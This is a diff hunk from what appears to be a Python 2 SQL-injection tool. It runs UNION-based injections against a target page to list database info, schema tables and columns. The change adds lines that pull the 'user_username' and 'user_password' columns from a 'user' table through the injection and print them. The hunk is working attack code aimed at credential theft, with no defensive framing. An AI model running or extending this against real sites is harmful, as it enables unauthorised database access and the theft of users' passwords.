@@ -43,15 +43,21 @@ if __name__ == '__main__':
     print '\n### Basic DB Info ###'
     data = fang.injection(page, build.union(num_columns, magic_num)) 
     report.db_info(parse.db_values(data))
-    data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
     print '### Interesting Tables ###'
+    data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
     report.tables(parse.information_schema(data))
 
     # Get table data
     print '\n### DB Table Info ###'
     data = fang.injection(page, build.columns(num_columns, magic_num)) 
     report.columns(parse.table_for_columns(data))
-    print build.values(num_columns, magic_num, 'user', ['user_username', 'user_password'])
+    x = build.values(num_columns, magic_num, 'user', ['user_username', 'user_password'])
+    data = fang.injection(page, x)
+    print data
+    #print parse.columns_for_rows(data)
+    #report.XXX(parse.XXX(data))
+
+
 
 
 
